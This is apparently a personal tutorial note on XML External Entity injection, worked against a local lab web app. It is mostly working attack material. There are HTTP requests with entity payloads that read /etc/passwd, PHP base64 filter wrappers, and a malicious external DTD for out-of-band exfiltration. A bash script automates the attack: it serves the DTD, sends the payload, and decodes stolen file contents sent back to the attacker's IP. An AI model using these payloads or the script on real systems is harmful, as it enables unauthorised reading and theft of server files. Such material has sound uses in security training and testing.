
# XML External Entity Injection

This vulnerability allow to use a malicious entry in XML to access local files or network services


----

## Playing with Entity
In a response XML you can play with Entities to exploit

Image that you have this request and obtain and output that represent the field email :

````xml
POST /process.php HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 188
Origin: http://localhost:5000
Connection: close
Referer: http://localhost:5000/
Cookie: session=eyJfY3NyZl90b2tlbiI6IjEwODhjZWY5LTA0NTctNDAyOC1hN2U2LTE2MjY5ZDE2YmRmMyIsInVzZXJuYW1lIjoic2VyZ2lvIn0.ZKf5OQ.lsRfGQCViG6at7ebf8Z7yMF8myQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

<?xml version="1.0" encoding="UTF-8"?>
<root>
	  <name>test</name>
	  <tel>123456789</tel>
	  <email>sergiky@sergiky.com</email>
	  <password>sergiky123</password>
</root>
````

You can **add an entity** to refer to the email

````xml
POST /process.php HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 188
Origin: http://localhost:5000
Connection: close
Referer: http://localhost:5000/
Cookie: session=eyJfY3NyZl90b2tlbiI6IjEwODhjZWY5LTA0NTctNDAyOC1hN2U2LTE2MjY5ZDE2YmRmMyIsInVzZXJuYW1lIjoic2VyZ2lvIn0.ZKf5OQ.lsRfGQCViG6at7ebf8Z7yMF8myQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo[<!ENTITY myName "sergiky">]>
<root>
	  <name>test</name>
	  <tel>123456789</tel>
	  <email>&myName;</email>
	  <password>sergiky123</password>
</root>
````

When you check that this work, you can check internal files with this wrapper:

> file://etc/passwd

This wrapper represent in the same line the information in base64:

> php://filter/convert.base64-encode/resource=/etc/passwd

````xml
POST /process.php HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: text/plain;charset=UTF-8
Content-Length: 188
Origin: http://localhost:5000
Connection: close
Referer: http://localhost:5000/
Cookie: session=eyJfY3NyZl90b2tlbiI6IjEwODhjZWY5LTA0NTctNDAyOC1hN2U2LTE2MjY5ZDE2YmRmMyIsInVzZXJuYW1lIjoic2VyZ2lvIn0.ZKf5OQ.lsRfGQCViG6at7ebf8Z7yMF8myQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo[<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
<root>
	  <name>test</name>
	  <tel>123456789</tel>
	  <email>&myFile;</email>
	  <password>sergiky123</password>
</root>
````

-----

## XXE OOB ( XXE Out of band interaction)

Like blind XXE
This is when you don't see the output in the response or the web page don't allow you to put entities.

To do this attack you have to load a external DTD (for example is host in your attacker machine))

1. Check if you can load a entity if this not respond well try to load in a external dtd

2. Indicating the server with the file in the request:

````xml
<!DOCTYPE foo[<!ENTITY xxe SYSTEM "http://172.21.7.214/malicious.dtd">]>
````

3. You can call the file in the declaration with **%**

````xml
<!DOCTYPE foo[<!ENTITY % xxe SYSTEM "http://172.21.7.214/malicious.dtd"> %xxe; ]>
````

4. The malicious.dtd while be this:
````dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://172.21.7.214/?file=%file;' >">
%eval;
%exfil;
````

`&#x25;` --> Way to represent % in hexadecimal

You can automatize this with an script in bash:

````bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: "; read -r myFileName

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFileName\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://172.21.7.214/?file=%file;' >\">
%eval;
%exfil;"""

echo $malicious_dtd > malicious.dtd


sudo python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo[<!ENTITY % xxe SYSTEM "http://172.21.7.214/malicious.dtd"> %xxe; ]>
<root>
          <name>test</name>
          <tel>123456789</tel>
          <email>test@test.com</email>
          <password>sergiky123</password>
</root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null
````

-------

# Tags

#xxs #wrappers #bash 


----